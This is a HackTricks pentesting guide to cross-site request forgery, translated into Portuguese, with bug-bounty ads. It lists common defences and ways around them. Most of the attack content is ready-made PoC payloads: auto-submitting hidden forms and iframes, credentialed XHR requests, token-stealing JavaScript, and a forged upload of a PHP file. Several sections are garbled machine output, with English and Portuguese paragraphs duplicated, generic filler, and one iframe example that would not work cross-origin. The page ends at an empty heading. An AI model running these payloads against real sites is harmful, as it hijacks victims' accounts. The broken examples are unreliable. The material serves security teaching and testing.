# CSRF (Cross Site Request Forgery)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof √© o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof s√£o lan√ßadas apenas quando os clientes depositam o or√ßamento de recompensa. Voc√™ receber√° a recompensa ap√≥s a verifica√ß√£o do bug.

**Adquira experi√™ncia em pentesting web3**\
Protocolos de blockchain e contratos inteligentes s√£o a nova Internet! Domine a seguran√ßa web3 em seus dias de ascens√£o.

**Torne-se a lenda do hacker web3**\
Ganhe pontos de reputa√ß√£o com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

## O que √© CSRF?

**Cross-site request forgery** (tamb√©m conhecido como CSRF) √© uma vulnerabilidade de seguran√ßa na web que permite a um atacante **induzir os usu√°rios a realizar a√ß√µes que eles n√£o pretendem realizar**.\
Isso √© feito **fazendo um usu√°rio logado** na plataforma da v√≠tima acessar um site controlado pelo atacante e a partir da√≠ **executar** c√≥digo JS malicioso, enviar formul√°rios ou recuperar "imagens" para a **conta da v√≠tima**.

### Requisitos

Para ser capaz de explorar uma vulnerabilidade CSRF, voc√™ primeiro precisa **encontrar uma a√ß√£o relevante para explorar** (alterar senha ou email, fazer a v√≠tima seguir voc√™ em uma rede social, dar a voc√™ mais privil√©gios...). A **sess√£o deve depender apenas de cookies ou do cabe√ßalho de autentica√ß√£o b√°sica HTTP**, nenhum outro cabe√ßalho pode ser usado para manipular a sess√£o. E finalmente, n√£o deve haver **par√¢metros imprevis√≠veis** na solicita√ß√£o.

V√°rias **contramedidas** podem ser implementadas para evitar essa vulnerabilidade.

### **Defesas comuns**

* [**Cookies SameSite**](hacking-with-cookies/#samesite): Se o cookie de sess√£o estiver usando essa flag, voc√™ pode n√£o conseguir enviar o cookie de sites arbitr√°rios.
* [**Compartilhamento de recursos entre origens**](cors-bypass.md): Dependendo do tipo de solicita√ß√£o HTTP que voc√™ precisa fazer para explorar a a√ß√£o relevante, voc√™ pode levar em considera√ß√£o a **pol√≠tica CORS do site da v√≠tima**. _Observe que a pol√≠tica CORS n√£o afetar√° se voc√™ apenas quiser enviar uma solicita√ß√£o GET ou uma solicita√ß√£o POST de um formul√°rio e n√£o precisar ler a resposta._
* Solicitar a **senha** do usu√°rio para autorizar a a√ß√£o.
* Resolver um **captcha**
* Ler os cabe√ßalhos **Referrer** ou **Origin**. Se uma express√£o regular for usada, ela poder√° ser contornada, por exemplo, com:
* http://mal.net?orig=http://example.com (termina com a URL)
* http://example.com.mal.net (come√ßa com a URL)
* **Modificar** o **nome** dos **par√¢metros** da solicita√ß√£o POST ou GET
* Usar um **token CSRF** em cada sess√£o. Esse token deve ser enviado dentro da solicita√ß√£o para confirmar a a√ß√£o. Esse token pode ser protegido com CORS.

### Mapa CSRF

![](<../.gitbook/assets/image (112).png>)

## Bypass de Defesas

### De POST para GET

Talvez o formul√°rio que voc√™ deseja explorar esteja preparado para enviar uma **solicita√ß√£o POST com um token CSRF**, mas voc√™ deve **verificar** se um **GET** tamb√©m √© **v√°lido** e se, ao enviar uma solicita√ß√£o GET, o **token CSRF ainda est√° sendo validado**.

### Falta de token

Algumas aplica√ß√µes **validam corretamente o token quando ele est√° presente, mas ignoram a valida√ß√£o se o token for omitido**.\
Nessa situa√ß√£o, o atacante pode **remover o par√¢metro inteiro** que cont√©m o token (n√£o apenas o valor) para contornar a valida√ß√£o e realizar um ataque CSRF.

### Token CSRF n√£o est√° vinculado √† sess√£o do usu√°rio

Algumas aplica√ß√µes **n√£o validam se o token pertence √† mesma sess√£o** do usu√°rio que est√° fazendo a solicita√ß√£o. Em vez disso, a aplica√ß√£o **mant√©m um pool global de tokens** que emitiu e aceita qualquer token que apare√ßa nesse pool.\
Nessa situa√ß√£o, o atacante pode fazer login na aplica√ß√£o usando sua pr√≥pria conta, **obter um token v√°lido** e, em seguida, **enviar esse token para o usu√°rio v√≠tima** em seu ataque CSRF.

### Bypass de m√©todo

Se a solicita√ß√£o estiver usando um **m√©todo "estranho"**, verifique se a **funcionalidade de substitui√ß√£o de m√©todo** est√° funcionando.\
Por exemplo, se estiver **usando o m√©todo PUT**, voc√™ pode tentar **usar o m√©todo POST** e **enviar**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Isso tamb√©m pode funcionar enviando o **par√¢metro \_method dentro de uma solicita√ß√£o POST** ou usando os **cabe√ßalhos**:

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_
### Bypass personalizado de token de cabe√ßalho

Se a solicita√ß√£o estiver adicionando um **cabe√ßalho personalizado** com um **token** √† solicita√ß√£o como m√©todo de **prote√ß√£o CSRF**, ent√£o:

* Teste a solicita√ß√£o sem o **Token Personalizado e tamb√©m o cabe√ßalho**.
* Teste a solicita√ß√£o com um **token diferente, mas com o mesmo comprimento**.

### O token CSRF √© verificado por um cookie

Em uma varia√ß√£o adicional da vulnerabilidade anterior, alguns aplicativos **duplicam cada token em um cookie e em um par√¢metro de solicita√ß√£o**. Ou o **configuram um cookie csrf** e **verificam no backend se o token csrf enviado √© o relacionado ao cookie**.

Quando a solicita√ß√£o subsequente √© validada, o aplicativo simplesmente verifica se o **token** enviado no **par√¢metro de solicita√ß√£o corresponde** ao valor armazenado pelo **cookie**.\
Nessa situa√ß√£o, o atacante pode novamente realizar um ataque CSRF **se o site conter alguma vulnerabilidade que permita que ele configure seu cookie CSRF para a v√≠tima como um CRLF**.

Nesse caso, voc√™ pode configurar o cookie tentando carregar uma imagem falsa e, em seguida, lan√ßar o ataque CSRF, como neste exemplo:
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>
```
{% hint style="info" %}
Observe que se o **token csrf estiver relacionado ao cookie de sess√£o, esse ataque n√£o funcionar√°** porque voc√™ precisar√° definir a sess√£o da v√≠tima e, portanto, estar√° atacando a si mesmo.
{% endhint %}

### Altera√ß√£o do Content-Type

De acordo com [**isso**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), para **evitar solicita√ß√µes de pr√©-voo** usando o m√©todo **POST**, esses s√£o os valores permitidos para o Content-Type:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

No entanto, observe que a **l√≥gica dos servidores pode variar** dependendo do **Content-Type** usado, portanto, voc√™ deve tentar os valores mencionados e outros como **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Exemplo (de [aqui](https://brycec.me/posts/corctf\_2021\_challenges)) de envio de dados JSON como text/plain:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### Bypassar solicita√ß√£o de pr√©-voo de aplicativo/json

Como voc√™ j√° sabe, n√£o √© poss√≠vel enviar uma solicita√ß√£o POST com o Content-Type **`application/json`** via formul√°rio HTML e, se voc√™ tentar fazer isso via **`XMLHttpRequest`**, uma solicita√ß√£o de pr√©-voo √© enviada primeiro.\
No entanto, voc√™ pode tentar enviar os dados JSON usando os tipos de conte√∫do **`text/plain`** e **`application/x-www-form-urlencoded`** apenas para verificar se o backend est√° usando os dados independentemente do Content-Type.\
Voc√™ pode enviar um formul√°rio usando `Content-Type: text/plain` definindo **`enctype="text/plain"`**

Se o servidor estiver aceitando apenas o tipo de conte√∫do "application/json", voc√™ pode **enviar o tipo de conte√∫do "text/plain; application/json"** sem acionar uma solicita√ß√£o de pr√©-voo.

Voc√™ tamb√©m pode tentar **burlar** essa restri√ß√£o usando um **arquivo SWF flash**. Para mais informa√ß√µes, [**leia este post**](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Bypassar verifica√ß√£o de Referrer / Origin

**Evite o cabe√ßalho Referer**

Alguns aplicativos validam o cabe√ßalho Referer quando ele est√° presente nas solicita√ß√µes, mas **ignoram a valida√ß√£o se o cabe√ßalho for omitido**.
```markup
<meta name="referrer" content="never">
```
**Burlas de Regexp**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Para definir o nome de dom√≠nio do servidor na URL que o Referrer vai enviar dentro dos par√¢metros, voc√™ pode fazer:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof √© o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof s√£o lan√ßadas apenas quando os clientes depositam o or√ßamento de recompensa. Voc√™ receber√° a recompensa ap√≥s a verifica√ß√£o do bug.

**Adquira experi√™ncia em pentesting web3**\
Protocolos de blockchain e contratos inteligentes s√£o a nova Internet! Domine a seguran√ßa web3 em seus dias de ascens√£o.

**Torne-se uma lenda hacker web3**\
Ganhe pontos de reputa√ß√£o com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) e comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

## **Exemplos de Explora√ß√£o**

### **Exfiltrando o Token CSRF**

Se um **token CSRF** estiver sendo usado como **defesa**, voc√™ pode tentar **exfiltr√°-lo** abusando de uma vulnerabilidade [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) ou uma vulnerabilidade [**Dangling Markup**](dangling-markup-html-scriptless-injection.md).

### **GET usando tags HTML**
```markup
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Outras tags HTML5 que podem ser usadas para enviar automaticamente uma solicita√ß√£o GET s√£o:

![](<../.gitbook/assets/image (530).png>)

### Solicita√ß√£o GET de formul√°rio
```markup
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Requisi√ß√£o POST de formul√°rio

A form POST request is a type of HTTP request that is used to submit data from an HTML form to a server. This type of request is commonly used in web applications to send user input data, such as login credentials or form submissions, to the server for processing.

Uma requisi√ß√£o POST de formul√°rio √© um tipo de requisi√ß√£o HTTP que √© usada para enviar dados de um formul√°rio HTML para um servidor. Esse tipo de requisi√ß√£o √© comumente usado em aplica√ß√µes web para enviar dados de entrada do usu√°rio, como credenciais de login ou envio de formul√°rios, para o servidor para processamento.

To make a form POST request, the client sends an HTTP POST request to the server's endpoint, typically specified in the `action` attribute of the HTML form. The request includes the form data as key-value pairs in the request body.

Para fazer uma requisi√ß√£o POST de formul√°rio, o cliente envia uma requisi√ß√£o HTTP POST para o endpoint do servidor, normalmente especificado no atributo `action` do formul√°rio HTML. A requisi√ß√£o inclui os dados do formul√°rio como pares de chave-valor no corpo da requisi√ß√£o.

The server receives the form data and processes it according to the application's logic. This can involve storing the data in a database, performing calculations, or generating a response to be sent back to the client.

O servidor recebe os dados do formul√°rio e os processa de acordo com a l√≥gica da aplica√ß√£o. Isso pode envolver armazenar os dados em um banco de dados, realizar c√°lculos ou gerar uma resposta para ser enviada de volta ao cliente.

It's important to note that form POST requests can be vulnerable to Cross-Site Request Forgery (CSRF) attacks if proper security measures are not in place. CSRF attacks occur when an attacker tricks a user into unknowingly submitting a form on a trusted website, leading to unintended actions being performed on the user's behalf.

√â importante observar que as requisi√ß√µes POST de formul√°rio podem ser vulner√°veis a ataques de Cross-Site Request Forgery (CSRF) se as medidas de seguran√ßa adequadas n√£o forem implementadas. Os ataques CSRF ocorrem quando um atacante engana um usu√°rio a enviar um formul√°rio em um site confi√°vel, levando a a√ß√µes n√£o intencionais sendo executadas em nome do usu√°rio.
```markup
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Requisi√ß√£o POST de formul√°rio por meio de iframe

Uma t√©cnica comum para realizar um ataque de falsifica√ß√£o de solicita√ß√£o entre sites (CSRF) √© enviar uma requisi√ß√£o POST de formul√°rio por meio de um elemento `<iframe>`. Isso permite que um invasor engane o navegador do usu√°rio para que ele envie uma solicita√ß√£o n√£o autorizada em nome do usu√°rio autenticado.

O processo geral para realizar esse ataque √© o seguinte:

1. O invasor cria um site malicioso contendo um formul√°rio que ser√° enviado para o alvo.
2. O invasor incorpora esse site malicioso em uma p√°gina leg√≠tima usando um elemento `<iframe>`.
3. Quando a p√°gina leg√≠tima √© carregada no navegador do usu√°rio, o formul√°rio malicioso tamb√©m √© carregado no `<iframe>`.
4. O invasor pode preencher automaticamente o formul√°rio com dados maliciosos e envi√°-lo usando JavaScript.
5. O navegador do usu√°rio, ao encontrar o formul√°rio no `<iframe>`, enviar√° a solicita√ß√£o POST para o alvo, incluindo as credenciais de autentica√ß√£o do usu√°rio.
6. O alvo, ao receber a solicita√ß√£o, acreditar√° que ela foi enviada pelo usu√°rio autenticado e processar√° a a√ß√£o solicitada.

Para se proteger contra ataques CSRF, √© importante implementar medidas de seguran√ßa, como o uso de tokens CSRF, que s√£o valores √∫nicos gerados pelo servidor e inclu√≠dos em cada formul√°rio. Esses tokens s√£o verificados pelo servidor para garantir que a solicita√ß√£o seja leg√≠tima e n√£o provenha de um ataque CSRF.
```markup
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Requisi√ß√£o POST Ajax**

Uma requisi√ß√£o POST Ajax √© uma t√©cnica usada para enviar dados para um servidor sem recarregar a p√°gina. Isso √© feito usando a fun√ß√£o `$.ajax()` do jQuery ou a classe `XMLHttpRequest` do JavaScript puro.

A requisi√ß√£o POST Ajax √© frequentemente usada em ataques de falsifica√ß√£o de solicita√ß√£o entre sites (CSRF), onde um invasor engana um usu√°rio autenticado a executar a√ß√µes indesejadas em um site sem o seu conhecimento.

Durante um ataque CSRF, o invasor cria um formul√°rio malicioso em um site controlado por ele e o envia para a v√≠tima. Quando a v√≠tima visita o site malicioso, o formul√°rio √© automaticamente enviado para o site alvo, executando a a√ß√£o indesejada em nome da v√≠tima.

Para se proteger contra ataques CSRF, √© importante implementar medidas de seguran√ßa, como o uso de tokens CSRF, que s√£o valores √∫nicos gerados pelo servidor e inclu√≠dos em cada solicita√ß√£o. O servidor verifica se o token √© v√°lido antes de processar a solicita√ß√£o.

√â essencial que os desenvolvedores estejam cientes dos riscos associados √†s requisi√ß√µes POST Ajax e implementem as devidas medidas de seguran√ßa para proteger seus aplicativos contra ataques CSRF.
```markup
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### Requisi√ß√£o POST multipart/form-data

A requisi√ß√£o POST multipart/form-data √© um tipo de requisi√ß√£o utilizada para enviar dados bin√°rios, como arquivos, atrav√©s de um formul√°rio HTML. Essa t√©cnica √© comumente utilizada em aplica√ß√µes web para o envio de arquivos de imagem, √°udio, v√≠deo, entre outros.

Nesse tipo de requisi√ß√£o, os dados s√£o divididos em v√°rias partes, cada uma com seu pr√≥prio cabe√ßalho e conte√∫do. Cada parte √© separada por um delimitador, que √© especificado no cabe√ßalho da requisi√ß√£o.

Para realizar um ataque de Cross-Site Request Forgery (CSRF) em uma requisi√ß√£o POST multipart/form-data, o invasor pode criar um formul√°rio HTML falso em um site malicioso. Esse formul√°rio ser√° projetado para enviar uma requisi√ß√£o POST para o alvo, contendo dados manipulados.

Quando um usu√°rio leg√≠timo acessa o site malicioso e submete o formul√°rio, a requisi√ß√£o √© enviada para o alvo, como se fosse uma a√ß√£o realizada pelo pr√≥prio usu√°rio. Isso pode levar a a√ß√µes indesejadas, como a altera√ß√£o de dados, a execu√ß√£o de a√ß√µes n√£o autorizadas ou at√© mesmo a transfer√™ncia de fundos.

Para se proteger contra ataques CSRF em requisi√ß√µes POST multipart/form-data, √© recomendado o uso de tokens de seguran√ßa, como o CSRF token. Esse token √© gerado pelo servidor e inclu√≠do no formul√°rio HTML. Ao submeter o formul√°rio, o token √© verificado pelo servidor para garantir que a requisi√ß√£o seja leg√≠tima.

√â importante que os desenvolvedores estejam cientes dessa vulnerabilidade e implementem as devidas medidas de seguran√ßa para proteger suas aplica√ß√µes web contra ataques CSRF.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### Requisi√ß√£o POST multipart/form-data v2

In this technique, we will explore how to perform a Cross-Site Request Forgery (CSRF) attack using a multipart/form-data POST request.

Nesta t√©cnica, exploraremos como realizar um ataque de Cross-Site Request Forgery (CSRF) usando uma requisi√ß√£o POST multipart/form-data.

#### Introduction

#### Introdu√ß√£o

Cross-Site Request Forgery (CSRF) is an attack that tricks the victim into submitting a malicious request. This attack occurs when a malicious website or application forces the victim's browser to make a request to a target website where the victim is authenticated.

Cross-Site Request Forgery (CSRF) √© um ataque que engana a v√≠tima a enviar uma requisi√ß√£o maliciosa. Esse ataque ocorre quando um site ou aplicativo malicioso for√ßa o navegador da v√≠tima a fazer uma requisi√ß√£o para um site alvo onde a v√≠tima est√° autenticada.

#### Exploiting CSRF with multipart/form-data POST request

#### Explorando CSRF com requisi√ß√£o POST multipart/form-data

1. Identify the target website that is vulnerable to CSRF.

1. Identifique o site alvo que √© vulner√°vel a CSRF.

2. Analyze the target website's functionality and identify a form or action that performs a sensitive action, such as changing the user's password or making a financial transaction.

2. Analise a funcionalidade do site alvo e identifique um formul√°rio ou a√ß√£o que execute uma a√ß√£o sens√≠vel, como alterar a senha do usu√°rio ou realizar uma transa√ß√£o financeira.

3. Craft a malicious HTML page or email that includes a form with the target website's action URL and necessary input fields.

3. Crie uma p√°gina HTML ou e-mail malicioso que inclua um formul√°rio com a URL de a√ß√£o do site alvo e os campos de entrada necess√°rios.

4. Include a hidden input field with the CSRF token value obtained from the target website.

4. Inclua um campo de entrada oculto com o valor do token CSRF obtido do site alvo.

5. Trick the victim into visiting the malicious page or clicking on the malicious email.

5. Engane a v√≠tima para visitar a p√°gina maliciosa ou clicar no e-mail malicioso.

6. When the victim submits the form, the browser will automatically send the multipart/form-data POST request to the target website, performing the sensitive action.

6. Quando a v√≠tima enviar o formul√°rio, o navegador enviar√° automaticamente a requisi√ß√£o POST multipart/form-data para o site alvo, executando a a√ß√£o sens√≠vel.

7. The target website will process the request, considering it legitimate since it came from the victim's browser with valid authentication cookies.

7. O site alvo processar√° a requisi√ß√£o, considerando-a leg√≠tima, uma vez que veio do navegador da v√≠tima com cookies de autentica√ß√£o v√°lidos.

8. The sensitive action will be performed on behalf of the victim without their knowledge or consent.

8. A a√ß√£o sens√≠vel ser√° realizada em nome da v√≠tima sem o seu conhecimento ou consentimento.

#### Mitigating CSRF Attacks

#### Mitigando Ataques CSRF

To mitigate CSRF attacks, web developers can implement the following measures:

Para mitigar ataques CSRF, os desenvolvedores web podem implementar as seguintes medidas:

1. Implement CSRF tokens: Include a unique CSRF token in each form or action that performs sensitive actions. This token should be validated on the server-side to ensure that the request is legitimate.

1. Implemente tokens CSRF: Inclua um token CSRF √∫nico em cada formul√°rio ou a√ß√£o que execute a√ß√µes sens√≠veis. Esse token deve ser validado no lado do servidor para garantir que a requisi√ß√£o seja leg√≠tima.

2. Use SameSite cookies: Set the SameSite attribute on cookies to restrict their usage to the same site. This prevents the browser from sending cookies in cross-site requests.

2. Use cookies SameSite: Defina o atributo SameSite nos cookies para restringir o uso deles ao mesmo site. Isso impede que o navegador envie cookies em requisi√ß√µes entre sites.

3. Implement CAPTCHAs: Use CAPTCHAs to verify that the request is being made by a human and not an automated script.

3. Implemente CAPTCHAs: Use CAPTCHAs para verificar se a requisi√ß√£o est√° sendo feita por um humano e n√£o por um script automatizado.

By implementing these measures, web developers can significantly reduce the risk of CSRF attacks on their websites.

Ao implementar essas medidas, os desenvolvedores web podem reduzir significativamente o risco de ataques CSRF em seus sites.
```javascript
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Requisi√ß√£o POST de formul√°rio de dentro de um iframe

When an HTML form is submitted, the browser sends a POST request to the specified URL. This behavior can be exploited in a Cross-Site Request Forgery (CSRF) attack when the form is submitted from within an iframe.

Quando um formul√°rio HTML √© enviado, o navegador envia uma requisi√ß√£o POST para a URL especificada. Esse comportamento pode ser explorado em um ataque de Cross-Site Request Forgery (CSRF) quando o formul√°rio √© enviado de dentro de um iframe.

To perform a CSRF attack using an iframe, an attacker can create a webpage with an iframe that loads the target website's form. The attacker can then submit the form automatically using JavaScript.

Para realizar um ataque CSRF usando um iframe, um atacante pode criar uma p√°gina da web com um iframe que carrega o formul√°rio do site alvo. O atacante pode ent√£o enviar o formul√°rio automaticamente usando JavaScript.

Here's an example of how the attack can be executed:

Aqui est√° um exemplo de como o ataque pode ser executado:

```html
<iframe id="csrf-frame" src="https://target-website.com/form"></iframe>
<script>
  window.onload = function() {
    var frame = document.getElementById('csrf-frame');
    var form = frame.contentDocument.forms[0];
    form.submit();
  };
</script>
```

In this example, the attacker's webpage contains an iframe that loads the target website's form. The JavaScript code automatically submits the form as soon as the iframe is loaded.

Neste exemplo, a p√°gina da web do atacante cont√©m um iframe que carrega o formul√°rio do site alvo. O c√≥digo JavaScript envia automaticamente o formul√°rio assim que o iframe √© carregado.

By tricking a victim into visiting the attacker's webpage, the form submission will occur without the victim's knowledge or consent. This can lead to unauthorized actions being performed on the victim's behalf.

Ao enganar uma v√≠tima para visitar a p√°gina da web do atacante, o envio do formul√°rio ocorrer√° sem o conhecimento ou consentimento da v√≠tima. Isso pode levar a a√ß√µes n√£o autorizadas sendo realizadas em nome da v√≠tima.
```markup
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Roubar o Token CSRF e enviar uma requisi√ß√£o POST**

Um ataque de falsifica√ß√£o de solicita√ß√£o entre sites (CSRF) ocorre quando um invasor engana um usu√°rio autenticado a executar a√ß√µes indesejadas em um aplicativo da web no qual o usu√°rio est√° autenticado. Para realizar esse ataque, o invasor precisa roubar o token CSRF do usu√°rio e envi√°-lo em uma requisi√ß√£o POST.

Existem v√°rias maneiras de roubar o token CSRF de um usu√°rio. Alguns m√©todos comuns incluem:

1. **Cross-Site Scripting (XSS)**: O invasor pode explorar uma vulnerabilidade de XSS para injetar um script malicioso no aplicativo da web. Esse script pode ser usado para roubar o token CSRF do usu√°rio e envi√°-lo para o invasor.

2. **Phishing**: O invasor pode criar um site falso que se parece com o aplicativo da web leg√≠timo e enganar o usu√°rio a inserir suas credenciais. Ao fazer isso, o invasor tamb√©m pode roubar o token CSRF do usu√°rio.

3. **Malware**: O invasor pode infectar o computador do usu√°rio com malware que captura todas as informa√ß√µes enviadas pelo navegador, incluindo o token CSRF.

Depois de obter o token CSRF, o invasor pode us√°-lo para enviar uma requisi√ß√£o POST para o aplicativo da web em nome do usu√°rio autenticado. Isso pode permitir que o invasor execute a√ß√µes indesejadas, como alterar as configura√ß√µes da conta do usu√°rio, fazer compras n√£o autorizadas ou excluir dados importantes.

Para se proteger contra ataques CSRF, os desenvolvedores devem implementar medidas de seguran√ßa, como a inclus√£o de tokens CSRF em todas as formas e requisi√ß√µes POST. Os usu√°rios tamb√©m devem estar cientes dos riscos de seguran√ßa e evitar clicar em links suspeitos ou inserir suas credenciais em sites n√£o confi√°veis.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **Roubar o Token CSRF e enviar uma solicita√ß√£o Post usando um iframe, um formul√°rio e Ajax**

